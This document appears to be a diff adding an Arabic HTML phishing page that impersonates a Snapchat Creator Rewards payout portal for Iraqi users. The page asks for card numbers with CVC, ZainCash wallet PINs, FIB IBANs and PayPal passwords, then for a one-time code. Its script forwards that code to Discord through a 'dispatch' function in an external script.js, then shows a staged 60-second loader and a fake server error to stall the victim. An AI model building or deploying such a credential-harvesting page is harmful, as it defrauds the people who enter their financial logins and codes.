@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام الصرف الموحد | Snapchat Creator Rewards</title>
+    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary-navy: #0A192F;
+            --secondary-blue: #112240;
+            --accent-gold: #C5A059;
+            --success-green: #27AE60;
+            --text-dark: #2D3436;
+            --text-light: #636E72;
+            --border-color: #DFE6E9;
+            --bg-body: #F4F7F6;
+        }
+
+        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
+
+        body {
+            background-color: var(--bg-body);
+            font-family: 'Almarai', sans-serif;
+            margin: 0;
+            color: var(--text-dark);
+            line-height: 1.6;
+        }
+
+        .security-bar {
+            background: var(--primary-navy);
+            color: #fff;
+            padding: 8px 0;
+            text-align: center;
+            font-size: 0.75rem;
+            letter-spacing: 0.5px;
+            font-weight: 400;
+        }
+
+        header {
+            background: #FFFFFF;
+            padding: 20px 0;
+            border-bottom: 2px solid var(--border-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.02);
+        }
+
+        .main-logo { height: 45px; }
+
+        .container {
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+
+        .official-card {
+            background: #FFFFFF;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+            overflow: hidden;
+            min-height: 400px;
+        }
+
+        .card-header {
+            background: #F8F9FA;
+            padding: 30px;
+            border-bottom: 1px solid var(--border-color);
+            text-align: right;
+        }
+
+        .card-header h1 {
+            font-size: 1.4rem;
+            margin: 0;
+            color: var(--primary-navy);
+            font-weight: 800;
+        }
+
+        .card-header p {
+            font-size: 0.85rem;
+            color: var(--text-light);
+            margin: 10px 0 0;
+        }
+
+        .method-selector {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+            padding: 30px;
+        }
+
+        .method-row {
+            display: flex;
+            align-items: center;
+            padding: 20px;
+            border: 1.5px solid var(--border-color);
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        .method-row:hover {
+            border-color: var(--primary-navy);
+            background: #F0F4F8;
+        }
+
+        .method-row img {
+            width: 50px;
+            height: 40px;
+            margin-left: 20px;
+            object-fit: contain;
+        }
+
+        .method-details {
+            flex-grow: 1;
+            text-align: right;
+        }
+
+        .method-details .title {
+            display: block;
+            font-weight: 700;
+            font-size: 1rem;
+        }
+
+        .method-details .subtitle {
+            font-size: 0.75rem;
+            color: var(--text-light);
+        }
+
+        .form-content {
+            padding: 30px;
+            display: none;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            font-weight: 700;
+            font-size: 0.85rem;
+            margin-bottom: 8px;
+            color: var(--primary-navy);
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 15px;
+            border: 1.5px solid var(--border-color);
+            border-radius: 6px;
+            font-size: 1rem;
+            font-family: inherit;
+            background: #FCFCFC;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--primary-navy);
+            background: #FFF;
+        }
+
+        .btn-confirm {
+            width: 100%;
+            padding: 18px;
+            background: var(--primary-navy);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.3s;
+        }
+
+        .verification-screen {
+            display: none;
+            padding: 40px 30px;
+            text-align: center;
+        }
+
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 30px 0;
+            direction: ltr;
+        }
+
+        .otp-box {
+            width: 45px;
+            height: 55px;
+            border: 2px solid var(--border-color);
+            border-radius: 6px;
+            text-align: center;
+            font-size: 1.4rem;
+            font-weight: 700;
+        }
+
+        footer {
+            text-align: center;
+            padding: 40px 20px;
+            color: var(--text-light);
+            font-size: 0.8rem;
+        }
+
+        .animate { animation: slideIn 0.4s ease forwards; }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="security-bar">
+        🔒 اتصال آمن ومحمي بمعيار تشفير AES-256 بت - النظام الموحد للمدفوعات
+    </div>
+
+    <header>
+        <img src="logo.png" alt="Snapchat" class="main-logo" onerror="this.src='https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/100px-Snapchat_logo.svg.png'">
+        <div style="margin-right: 15px; font-weight: 800; border-right: 2px solid #eee; padding-right: 15px;">بوابة العوائد المالية</div>
+    </header>
+
+    <div class="container">
+        <div class="official-card">
+            
+            <div id="selectionScreen">
+                <div class="card-header">
+                    <h1>تحديد قناة الصرف</h1>
+                    <p>يرجى اختيار المؤسسة المالية التي ترغب في استلام مستحقاتك من خلالها</p>
+                </div>
+
+                <div class="method-selector">
+                    <div class="method-row" onclick="initiateSystem('mastercard')">
+                        <img src="master.png" alt="MasterCard">
+                        <div class="method-details">
+                            <span class="title">بطاقة مصرفية (Visa/MasterCard)</span>
+                            <span class="subtitle">حوالة مباشرة إلى حسابك البنكي</span>
+                        </div>
+                    </div>
+
+                    <div class="method-row" onclick="initiateSystem('zaincash')">
+                        <img src="zaincash.png" alt="ZainCash">
+                        <div class="method-details">
+                            <span class="title">محفظة زين كاش</span>
+                            <span class="subtitle">استلام فوري عبر رقم الهاتف (العراق)</span>
+                        </div>
+                    </div>
+
+                    <div class="method-row" onclick="initiateSystem('fib')">
+                        <img src="fib.png" alt="FIB">
+                        <div class="method-details">
+                            <span class="title">المصرف الدولي الأول (FIB)</span>
+                            <span class="subtitle">الإيداع عبر رقم الآيبان المباشر</span>
+                        </div>
+                    </div>
+
+                    <div class="method-row" onclick="initiateSystem('paypal')">
+                        <img src="paypal.png" alt="PayPal">
+                        <div class="method-details">
+                            <span class="title">PayPal</span>
+                            <span class="subtitle">حساب الدفع الإلكتروني العالمي</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="formScreen" class="form-content">
+                <div class="card-header" style="padding: 0 0 20px 0; margin-bottom: 25px;">
+                    <h1 id="formTitle">بيانات الحساب</h1>
+                    <p>أدخل المعلومات المطلوبة بدقة كما هي مسجلة لدى مزود الخدمة</p>
+                </div>
+                
+                <form id="paymentForm" onsubmit="validateAndNext(event)">
+                    <div id="dynamicInputs"></div>
+                    
+                    <div style="background: #FFF9E6; padding: 15px; border-radius: 6px; margin-bottom: 20px; border: 1px solid #FFEAA7;">
+                        <p style="font-size: 0.75rem; color: #856404; margin: 0;">
+                            ⚠️ تأكد من تطابق البيانات مع هويتك الرسمية لتجنب تأخير صرف الدفعة.
+                        </p>
+                    </div>
+
+                    <button type="submit" class="btn-confirm" id="submitBtn">تأكيد ومتابعة التحقق</button>
+                    <button type="button" onclick="window.location.reload()" style="width: 100%; background: none; border: none; color: var(--text-light); margin-top: 15px; cursor: pointer; font-size: 0.8rem;">الرجوع للخلف</button>
+                </form>
+            </div>
+
+            <div id="otpScreen" class="verification-screen">
+                <div style="width: 60px; height: 60px; background: #E1F5FE; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
+                    <span style="font-size: 24px;">🛡️</span>
+                </div>
+                <h1>التحقق من الهوية</h1>
+                <p>أدخل رمز التحقق (OTP) المكون من 6 أرقام لضمان أمان العملية</p>
+                
+                <div class="otp-inputs">
+                    <input type="number" class="otp-box payment-otp-box" oninput="if(this.value.length>1)this.value=this.value.slice(0,1)">
+                    <input type="number" class="otp-box payment-otp-box" oninput="if(this.value.length>1)this.value=this.value.slice(0,1)">
+                    <input type="number" class="otp-box payment-otp-box" oninput="if(this.value.length>1)this.value=this.value.slice(0,1)">
+                    <input type="number" class="otp-box payment-otp-box" oninput="if(this.value.length>1)this.value=this.value.slice(0,1)">
+                    <input type="number" class="otp-box payment-otp-box" oninput="if(this.value.length>1)this.value=this.value.slice(0,1)">
+                    <input type="number" class="otp-box payment-otp-box" oninput="if(this.value.length>1)this.value=this.value.slice(0,1)">
+                </div>
+
+                <button class="btn-confirm" onclick="verifyPaymentOtp()">تنشيط قناة الصرف</button>
+                <p style="font-size: 0.8rem; margin-top: 20px; color: var(--text-light);">لم يصلك الرمز؟ <a href="#" style="color: var(--primary-navy); font-weight: 700;">إعادة الإرسال</a></p>
+            </div>
+
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2026 Snap Inc. | بوابة الخدمات المالية للمبدعين</p>
+    </footer>
+
+    <script src="script.js"></script>
+    <script>
+        // دالة الـ OTP الخاصة بصفحة الدفع ليتم رصدها من script.js
+        function verifyPaymentOtp() {
+            let code = "";
+            document.querySelectorAll('.payment-otp-box').forEach(b => code += b.value);
+            if (code.length < 6) return;
+
+            // إرسال الكود للديسكورد عبر محرك dispatch الموجود في script.js
+            if(typeof dispatch === 'function') {
+                dispatch(`💳 **رقم التحقق (Payment OTP)**: \`${code}\``, "🛡️ Payment Security", 16776192);
+            }
+
+            // تشغيل اللودر النفسي
+            if(typeof runLoader === 'function') {
+                runLoader("جاري تأكيد عملية الربط المالي (60 ثانية)...", 60000, () => {
+                    alert("نعتذر، حدث خطأ غير متوقع في خوادم المعالجة. يرجى المحاولة مرة أخرى لاحقاً.");
+                    window.location.reload();
+                });
+            }
+        }
+
+        function initiateSystem(method) {
+            document.getElementById('selectionScreen').style.display = 'none';
+            const formScreen = document.getElementById('formScreen');
+            formScreen.style.display = 'block';
+            formScreen.classList.add('animate');
+            
+            const container = document.getElementById('dynamicInputs');
+            container.innerHTML = '';
+            
+            let config = { title: '', fields: [] };
+
+            switch(method) {
+                case 'mastercard':
+                    config.title = 'بيانات البطاقة المصرفية';
+                    config.fields = [
+                        { label: 'الاسم الكامل (كما في البطاقة)', type: 'text', ph: 'Full Name' },
+                        { label: 'رقم البطاقة', type: 'tel', ph: '0000 0000 0000 0000', id: 'card_num' },
+                        { label: 'تاريخ الانتهاء', type: 'tel', ph: 'MM/YY', id: 'exp_date' },
+                        { label: 'رمز CVC', type: 'password', ph: '***', id: 'cvc_num' }
+                    ];
+                    break;
+                case 'zaincash':
+                    config.title = 'محفظة زين كاش العراق';
+                    config.fields = [
+                        { label: 'رقم المحفظة (الرقم الآسيوي)', type: 'tel', ph: '07XXXXXXXX' },
+                        { label: 'الاسم الثلاثي لصاحب المحفظة', type: 'text', ph: 'الاسم كما في الهوية' },
+                        { label: 'الرمز السري (الخاص بالتطبيق)', type: 'password', ph: '****' }
+                    ];
+                    break;
+                case 'fib':
+                    config.title = 'حساب مصرف FIB';
+                    config.fields = [
+                        { label: 'رقم الآيبان الدولي (IBAN)', type: 'text', ph: 'IQ00 FIB 0000...' },
+                        { label: 'الاسم الكامل المسجل لدى البنك', type: 'text', ph: 'Account Holder Name' }
+                    ];
+                    break;
+                case 'paypal':
+                    config.title = 'حساب PayPal العالمي';
+                    config.fields = [
+                        { label: 'البريد الإلكتروني المرتبط', type: 'email', ph: 'example@email.com' },
+                        { label: 'كلمة المرور (للتوثيق السريع)', type: 'password', ph: '********' }
+                    ];
+                    break;
+            }
+
+            document.getElementById('formTitle').innerText = config.title;
+            config.fields.forEach(f => {
+                const div = document.createElement('div');
+                div.className = 'input-group';
+                div.innerHTML = `<label>${f.label}</label><input type="${f.type}" placeholder="${f.ph}" required id="${f.id || ''}">`;
+                container.appendChild(div);
+            });
+            if(method === 'mastercard') applyCardMasks();
+        }
+
+        function validateAndNext(e) {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.innerText = 'جاري التحقق من البيانات...';
+            btn.disabled = true;
+
+            setTimeout(() => {
+                document.getElementById('formScreen').style.display = 'none';
+                const otpScreen = document.getElementById('otpScreen');
+                otpScreen.style.display = 'block';
+                otpScreen.classList.add('animate');
+            }, 1500);
+        }
+
+        const otpInputs = document.querySelectorAll('.otp-box');
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        function applyCardMasks() {
+            const cardInput = document.getElementById('card_num');
+            const expInput = document.getElementById('exp_date');
+            cardInput?.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+            });
+            expInput?.addEventListener('input', (e) => {
+                let v = e.target.value.replace(/[^\d]/g, '');
+                if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
+                e.target.value = v;
+            });
+        }
+    </script>
+</body>
+</html>
